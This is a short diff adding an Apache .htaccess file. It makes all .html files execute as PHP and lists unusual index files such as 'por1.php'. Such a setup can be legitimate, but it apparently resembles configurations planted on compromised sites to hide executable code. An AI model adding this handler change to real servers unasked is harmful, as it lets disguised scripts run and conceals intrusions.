@@ -1,0 +1,14 @@
+
+
+DirectoryIndex index.html index.htm index.php portal.php por1.php
+
+<FilesMatch ".+\.html$">
+SetHandler application/x-httpd-php
+</FilesMatch>
+
+<IfModule php7_module>
+AddType application/x-httpd .php
+AddType application/x-httpd-source .phps
+</IfModule>
+
+
